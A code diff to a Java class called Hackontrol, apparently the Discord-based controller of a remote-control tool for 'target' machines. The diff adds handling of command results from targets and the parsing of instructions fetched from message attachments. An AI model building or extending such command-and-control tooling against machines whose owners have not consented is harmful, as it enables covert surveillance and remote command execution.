@@ -1,5 +1,7 @@
 package com.khopan.hackontrol;
 
+import java.io.InputStream;
+import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
@@ -113,6 +115,16 @@ public class Hackontrol {
 		target.screenshotTaken(attachment);
 	}
 
+	void commandResult(MachineId identifier, String result) {
+		Target target = this.getTarget(identifier);
+
+		if(target == null) {
+			return;
+		}
+
+		target.commandResult(result);
+	}
+
 	private boolean hasIdentifier(MachineId identifier) {
 		for(int i = 0; i < this.targetList.size(); i++) {
 			Target target = this.targetList.get(i);
@@ -168,7 +180,28 @@ public class Hackontrol {
 		public void onMessageReceived(MessageReceivedEvent Event) {
 			Message message = Event.getMessage();
 			String text = message.getContentDisplay();
-			Hackontrol.this.response.parse(text, message.getAttachments());
+			List<Attachment> attachmentList = message.getAttachments();
+
+			if(!text.isBlank()) {
+				Hackontrol.this.response.parse(text, attachmentList);
+				return;
+			}
+
+			attachmentList.remove(0);
+			Attachment attachment = attachmentList.get(0);
+
+			new Thread(() -> {
+				String content;
+
+				try {
+					InputStream stream = attachment.getProxy().download().get();
+					content = new String(stream.readAllBytes(), StandardCharsets.UTF_8);
+				} catch(Throwable ignored) {
+					return;
+				}
+
+				Hackontrol.this.response.parse(content, attachmentList);
+			}).start();
 		}
 	}
 }
